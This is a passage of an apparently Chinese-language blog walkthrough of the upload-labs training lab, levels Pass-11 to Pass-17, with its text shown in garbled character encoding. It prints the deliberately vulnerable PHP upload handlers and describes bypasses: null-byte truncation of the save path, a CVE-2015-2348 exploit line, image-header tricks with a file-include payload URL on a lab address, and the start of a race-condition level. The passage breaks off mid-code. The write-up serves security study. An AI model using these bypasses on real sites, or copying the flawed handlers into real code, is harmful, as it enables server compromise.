ä¹Ÿå¾ˆå¥½çš„è¯´æ˜äº†è¿™ä¸€ç‚¹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103170855286.png" alt="image-20201103170855286"></p><h2 id="Pass-11-00æˆªæ–­"><a href="#Pass-11-00æˆªæ–­" class="headerlink" title="Pass-11 %00æˆªæ–­"></a>Pass-11 %00æˆªæ–­</h2><h3 id="1-ä»£ç åˆ†æ-1"><a href="#1-ä»£ç åˆ†æ-1" class="headerlink" title="1. ä»£ç åˆ†æ"></a>1. ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-11</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>substr()</code> å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0</p><p>è¯­æ³•ï¼š<code>substr(string,start,length)</code></p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚<br />æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹<br />è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾çš„æŒ‡å®šä½ç½®å¼€å§‹<br />0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</td></tr><tr><td align="left"><em>length</em></td><td align="left">å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» start å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›</td></tr><tr><td align="left">è¿”å›å€¼ï¼š</td><td align="left">è¿”å›å­—ç¬¦ä¸²çš„æå–éƒ¨åˆ†ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</td></tr></tbody></table><blockquote><p><code>strrpos()</code> å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®</p><p><strong>æ³¨é‡Šï¼š</strong><code>strrpos()</code> å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿ</p><p>è¯­æ³•ï¼š<code>strrpos(string,find,start)</code></p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr><tr><td align="left">è¿”å›å€¼ï¼š</td><td align="left">è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALS</td></tr></tbody></table><p><a href="http://www.cnblogs.com/cyjaysun/p/4390930.html">CVE-2015-2348</a>å½±å“ç‰ˆæœ¬ï¼š<code>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7</code>expï¼š<code>move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\x00.jpg&quot;);</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103172830640.png" alt="image-20201103172830640"></p><h3 id="2-åˆ©ç”¨-10"><a href="#2-åˆ©ç”¨-10" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103174634003.png" alt="image-20201103174634003"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103174737499.png" alt="image-20201103174737499"></p><h2 id="Pass-12-0x00ç»•è¿‡"><a href="#Pass-12-0x00ç»•è¿‡" class="headerlink" title="Pass-12 0x00ç»•è¿‡"></a>Pass-12 0x00ç»•è¿‡</h2><h3 id="1-åˆ†æ-8"><a href="#1-åˆ†æ-8" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Pass-12</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195106747.png" alt="image-20201103195106747"></p><blockquote><p>php.iniè®¾ç½® <code>magic_quotes_gpc = Off</code></p></blockquote><p>åŸç†åŒ<strong>Pass-11</strong>ï¼Œä¸Šä¼ è·¯å¾„<code>0x00</code>ç»•è¿‡ã€‚åˆ©ç”¨Burpsuiteçš„HexåŠŸèƒ½å°†save_pathæ”¹æˆ<code>../upload/12.php(äºŒè¿›åˆ¶00)</code>å½¢å¼</p><h3 id="2-åˆ©ç”¨-11"><a href="#2-åˆ©ç”¨-11" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195331575.png" alt="image-20201103195331575"></p><p>1å¯¹åº”31ï¼Œæˆ‘ä»¬å°†31æ”¹æˆ<code>00</code>, </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195537359.png" alt="image-20201103195537359"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195630009.png" alt="image-20201103195630009"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103195700377.png" alt="image-20201103195700377"></p><h2 id="Pass-13-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"><a href="#Pass-13-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡" class="headerlink" title="Pass-13 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"></a>Pass-13 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡</h2><h3 id="1-åˆ†æ-9"><a href="#1-åˆ†æ-9" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œ</p><h3 id="2-åˆ©ç”¨-12"><a href="#2-åˆ©ç”¨-12" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103201222006.png" alt="image-20201103201222006"></p><p>ç»“åˆæ–‡ä»¶ä¸Šä¼ ï¼Œæ„é€ <code>payload:http://172.16.9.177/include.php?file=upload/5920201103201712.gif</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103201328775.png" alt="image-20201103201328775"></p><h2 id="Pass-14-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"><a href="#Pass-14-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡" class="headerlink" title="Pass-14 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"></a>Pass-14 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡</h2><p>åŒç†<code>Pass-13</code></p><h2 id="Pass-15-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"><a href="#Pass-15-æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡" class="headerlink" title="Pass-15 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡"></a>Pass-15 æ–‡ä»¶å¤´ç±»å‹ç»•è¿‡</h2><p>åŒç†<code>Pass14</code></p><h2 id="Pass-16-å›¾ç‰‡é©¬"><a href="#Pass-16-å›¾ç‰‡é©¬" class="headerlink" title="Pass-16 å›¾ç‰‡é©¬"></a>Pass-16 å›¾ç‰‡é©¬</h2><h3 id="1-åˆ†æ-10"><a href="#1-åˆ†æ-10" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†<code>åç¼€å</code>ã€<code>content-type</code>ï¼Œä»¥åŠåˆ©ç”¨<code>imagecreatefromgif</code>åˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“</p><h3 id="2-åˆ©ç”¨-13"><a href="#2-åˆ©ç”¨-13" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103202410138.png" alt="image-20201103202410138"></p><h2 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17 æ¡ä»¶ç«äº‰"></a>Pass-17 æ¡ä»¶ç«äº‰</h2><h3 id="1-åˆ†æ-11"><a href="#1-åˆ†æ-11" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . 